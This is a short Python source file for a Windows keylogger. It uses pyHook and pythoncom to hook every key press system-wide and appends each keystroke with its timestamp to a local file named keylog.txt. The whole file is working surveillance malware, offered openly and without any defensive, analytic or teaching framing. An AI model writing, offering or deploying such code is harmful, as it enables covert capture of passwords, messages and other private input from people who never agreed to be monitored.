# Keylogger module that records keystrokes and saves them to a file.

import pythoncom
import pyHook
import os

class Keylogger:
    def __init__(self):
        """
        Initializes the Keylogger class.
        """
        self.log_file = 'keylog.txt'

    def on_keyboard_event(self, event):
        """
        Handles keyboard events and writes the keystrokes to a log file.
        :param event: The keyboard event.
        """
        with open(self.log_file, 'a') as f:
            f.write(f'{event.Time}: {event.Key}\n')

    def start(self):
        """
        Starts the keylogger and hooks into keyboard events.
        """
        hm = pyHook.HookManager()
        hm.KeyDown = self.on_keyboard_event
        hm.HookKeyboard()
        pythoncom.PumpMessages()